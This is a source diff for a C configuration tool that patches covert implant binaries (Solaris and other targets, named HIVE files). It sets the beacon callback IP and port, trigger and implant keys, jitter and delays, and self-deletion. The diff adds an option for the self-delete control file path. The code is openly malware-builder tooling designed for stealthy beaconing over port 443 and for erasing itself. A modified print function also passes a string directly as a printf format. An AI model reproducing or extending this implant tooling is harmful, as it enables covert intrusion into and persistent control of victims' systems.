@@ -49,47 +49,60 @@
 
 #define ID_KEY_FILE	"ID-keys.txt"
 #define ID_KEY_DATETIME_FORMAT	"%4i/%02i/%02i %02i:%02i:%02i"
+#define	SD_PATH_LENGTH	128		// This is also defined in server/self_delete.h
 
 #define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH
 
 #define OPTMATCH(o, s) ( strlen((o))==strlen((s)) && (strcmp((o),(s))== 0) )
 
 //********************************************************************************
-//rsa_context           rsa;
-struct cl_args {
-	unsigned int sig;
-	unsigned int beacon_port;
-	unsigned int host_len;
-	char beacon_ip[256];
-	char iface[16];
-	unsigned char idKey[ID_KEY_HASH_SIZE];
-	unsigned long init_delay;
-	unsigned int interval;
-	unsigned int trigger_delay;
-	unsigned int jitter;
-	time_t delete_delay;
-	unsigned int patched;
-} __attribute__ ((packed));
 
-#define SIG_HEAD    0x7AD8CFB6
-
-struct cl_args args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
-
-#define DEFAULT_INITIAL_DELAY		3 * 60 * 1000	// 3 minutes
-#define DEFAULT_BEACON_PORT		443	// TCP port 443 (HTTPS)
-#define DEFAULT_BEACON_INTERVAL		0	// operators did not want a default value
-#define DEFAULT_TRIGGER_DELAY		60 * 1000	// 60 seconds
-#define DEFAULT_BEACON_JITTER		3	// Default value is 3, range is from 0<=jitter<=30
+#define SIG_HEAD    				0x7AD8CFB6
+#define DEFAULT_INITIAL_DELAY		3 * 60 * 1000		// 3 minutes
+#define DEFAULT_BEACON_PORT			443					// TCP port 443 (HTTPS)
+#define DEFAULT_BEACON_INTERVAL		0					// operators did not want a default value
+#define DEFAULT_TRIGGER_DELAY		60 * 1000			// 60 seconds
+#define DEFAULT_BEACON_JITTER		3					// Default value is 3, range is from 0<=jitter<=30
 #define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60	// Default value is 60 days...
 
+struct cl_args {
+	unsigned int 	sig;
+	unsigned int 	beacon_port;
+	unsigned int 	host_len;
+	char 			beacon_ip[256];
+	char			iface[16];
+	unsigned char	idKey[ID_KEY_HASH_SIZE];
+	unsigned long	init_delay;
+	unsigned int	interval;
+	unsigned int	trigger_delay;
+	unsigned int	jitter;
+	time_t			delete_delay;
+	char			sdpath[SD_PATH_LENGTH];
+	unsigned int	patched;
+} __attribute__ ((packed));
+
+struct cl_args args = {
+		SIG_HEAD,
+		DEFAULT_BEACON_PORT,
+		0,
+		{0},
+		{0},
+		{0},
+		DEFAULT_INITIAL_DELAY,
+		DEFAULT_BEACON_INTERVAL,
+		DEFAULT_TRIGGER_DELAY,
+		DEFAULT_BEACON_JITTER,
+		DEFAULT_SELF_DELETE_DELAY,
+		"/var",
+		1
+};
+
 //define displaySha1Hash function
-void printSha1Hash(FILE *file, char *label, unsigned char *sha1Hash)
+void printSha1Hash(FILE *file, char *tag, unsigned char *sha1Hash)
 {
 	int i = 0;
 
-	//Display Label
-	fprintf(file, "%s", label);
-
+	fprintf(file, tag);
 	//Display 40 hexadecimal number array
 	for (i = 0; i < ID_KEY_HASH_SIZE; i++)
 		fprintf(file, "%02x", sha1Hash[i]);
@@ -114,6 +127,7 @@ int usage(char **argv)
 	fprintf(stdout, "    %s-k <ID Key Phrase>%s - ID key phrase (maximum 100 character string)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
 	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
+	fprintf(stdout, "    %s-P <file path>%s     - (optional) self-delete control/log file directory path [default: /var]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-t <t_delay>%s       - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
@@ -176,16 +190,7 @@ int main(int argc, char **argv)
 
 	implantKey[0] = '\0';
 
-	args.patched = 1;
-	args.init_delay = DEFAULT_INITIAL_DELAY;
-	args.beacon_port = DEFAULT_BEACON_PORT;
-	args.interval = DEFAULT_BEACON_INTERVAL;
-	args.trigger_delay = DEFAULT_TRIGGER_DELAY;
-	args.delete_delay = DEFAULT_SELF_DELETE_DELAY;
-	args.jitter = DEFAULT_BEACON_JITTER;
-	args.host_len = 0;
-
-	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:p:s:t:")) != -1) {
+	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:s:t:")) != -1) {
 		switch (optval) {
 
 		case 'a':	// Hostname / IP address of beacon LP
@@ -360,6 +365,15 @@ int main(int argc, char **argv)
 			} while (0);
 			break;
 
+		case 'P':	// Set path for self-delete control and log files
+			if (strlen(optarg) + 9 < SD_PATH_LENGTH) {	// Make sure array is large enough for filename, '/' and '\0'
+				strcpy(args.sdpath, optarg);		// Copy the path from the command line
+			} else {
+				fprintf(stderr, "ERROR: Directory path is too long (maximum 120 characters)");
+				return -1;
+			}
+			break;
+
 		case 'p':	// beacon port
 			args.beacon_port = (unsigned int) atoi(optarg);
 			if (args.beacon_port < 1 || args.beacon_port > 65535) {
@@ -427,18 +441,19 @@ int main(int argc, char **argv)
 		}
 
 		printf("\n");
-		printf("  This application will generate PATCHED files with the following values:\n");
-		printf("   . Beacon Server IP address    -> %s\n", host);
-		printf("   . Beacon Server Port number   -> %d\n", args.beacon_port);
-		printSha1Hash(stdout, "   . Trigger Key                 -> ", triggerKey);
-		printf("\n");
-		printSha1Hash(stdout, "   . Implant Key                 -> ", implantKey);
-		printf("\n");
-		printf("   . Beacon Initial Delay        -> %lu (sec)\n", args.init_delay / 1000);
-		printf("   . Beacon Interval             -> %d (sec)\n", args.interval / 1000);
-		printf("   . Beacon Jitter               -> %d (percentage)\n", args.jitter);	//Added jitter display
-		printf("   . Self Delete Delay           -> %lu (sec)\n", args.delete_delay);
-		printf("   . Trigger Delay               -> %d +/- 30 (sec)\n", args.trigger_delay / 1000);
+		printf("  This application will generate PATCHED files with the following values:\n\n");
+		printf("\t%32s: %-s\n", "Beacon Server IP address", host);
+		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
+		printf("\t%32s: ", "Trigger Key");
+		printSha1Hash(stdout, "", triggerKey); printf("\n");
+		printf("\t%32s: ", "Implant Key");
+		printSha1Hash(stdout, "", implantKey); printf("\n");
+		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
+		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
+		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
+		printf("\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
+		printf("\t%32s: %-s\n", "Self Delete Control File Path", args.sdpath);
+		printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
 	}
 
 	if (solaris_sparc == 1 || solaris_x86 == 1) {
@@ -486,6 +501,7 @@ int main(int argc, char **argv)
 	if (raw == 0) {
 		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
 		cl_string((unsigned char *) args.iface, sizeof(args.iface));
+		cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
 	}
 
 	remove(HIVE_SOLARIS_SPARC_FILE);
